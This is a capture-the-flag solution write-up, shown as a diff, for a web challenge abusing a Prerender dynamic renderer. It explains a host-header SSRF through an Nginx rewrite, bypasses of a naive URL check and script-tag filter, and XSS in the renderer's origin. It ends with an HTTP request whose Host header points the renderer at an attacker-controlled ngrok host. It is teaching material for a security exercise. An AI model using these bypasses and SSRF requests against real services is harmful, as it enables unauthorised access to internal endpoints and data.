@@ -1,0 +1,93 @@
+<h1>Star Cereal Episode 3: The Revenge of the Breakfast - Solution</h1>
+
+<p><strong>Author</strong>: zeyu2001</p>
+
+<p><strong>Category</strong>: Web</p>
+
+<h2>Main Ideas</h2>
+
+<p>This challenge was heavily inspired by <a href="https://ctf.zeyu2001.com/2021/asian-cyber-security-challenge-acsc-2021/favorite-emojis">Favorite Emojis - ACSC 2021</a>.</p>
+
+<p>The challenge was centred around the unsafe use of dynamic renderers such as Prerender, which are pretty much SSRF-as-a-service.</p>
+
+<p>The main idea is that we could trick the dynamic renderer to render a sensitive internal endpoint by using a custom host header, since the Nginx configuration rewrites the URL using the host header as follows:</p>
+
+<p><code>nginx
+if ($prerender = 1) {
+    rewrite .* /$scheme://$host$request_uri? break;
+    proxy_pass http://prerender:3000;
+}
+</code></p>
+
+<p>When I attempted this challenge, many participants used client-side redirects to get the renderer to display the flag in the response body.</p>
+
+<p>This time, I added some extra checks to force the players to obtain XSS within the Chromium renderer and make use of the <code>localhost:3000</code> origin to bypass the Same Origin Policy.</p>
+
+<ol>
+<li><code>validateUrls</code> is a naive URL validation mechanism that checks whether the URL begins with <code>http://app</code>. This can be easily bypassed by using the <code>username:password@hostname</code> URL format.</li>
+</ol>
+
+<p>```javascript
+const validateUrls = (req, res, next) =&gt; {</p>
+
+<pre><code>let matches = url.parse(req.prerender.url).href.match(/^(http:\/\/|https:\/\/)app/gi)
+if (!matches) {
+    return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');
+}
+
+next();
+</code></pre>
+
+<p>}
+```</p>
+
+<p>To bypass this, use <code>Host: app@ATTACKER_URL</code></p>
+
+<ol start="2">
+<li><code>noScriptsPlease</code> is also a naive "script remover" that removes <code>&lt;script&gt;</code> tags. This can be easily bypassed by using <code>onload</code> event handlers and the like.</li>
+</ol>
+
+<p>```javascript
+const noScriptsPlease = (req, res, next) =&gt; {</p>
+
+<pre><code>if (!req.prerender.content || req.prerender.renderType != 'html') {
+    return next();
+}
+
+var matches = req.prerender.content.toString().match(/&lt;script(?:.*?)&gt;(?:[\S\s]*?)&lt;\/script&gt;/gi);
+if (matches)
+    return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');
+
+matches = req.prerender.content.toString().match(/&lt;link[^&gt;]+?rel="import"[^&gt;]*?&gt;/i);
+if (matches)
+    return res.send(403, 'NO_FLAG_FOR_YOU_MUAHAHAHA');
+
+next();
+</code></pre>
+
+<p>}
+```</p>
+
+<ol start="3">
+<li>The Nginx frontend will replace any flags in the response body. Therefore, this challenge cannot be trivially solved by using redirects to <code>http://app/login.php</code>. One must achieve XSS within the <code>localhost:3000</code> origin, and use the <code>localhost:3000/render?url=</code> feature to bypass the same-origin policy and read the flag.</li>
+</ol>
+
+<p>```nginx</p>
+
+<h1>Do or do not, there is no flag.</h1>
+
+<p>proxy<em>set</em>header Accept-Encoding "";
+subs<em>filter</em>types text/html text/css text/xml;
+subs<em>filter "SEE{.*}" "SEE{NO</em>FLAG<em>FOR</em>YOU_MUAHAHAHA}" ir;
+```</p>
+
+<h2>Solution</h2>
+
+<p>Host the <code>outer.html</code> and <code>inner.html</code> files, then make a request to <code>outer.html</code>:</p>
+
+<p>```http
+GET /outer.html HTTP/1.1
+Host: app@7022-42-60-216-15.ngrok.io
+User-Agent: googlebot</p>
+
+<p>```</p>
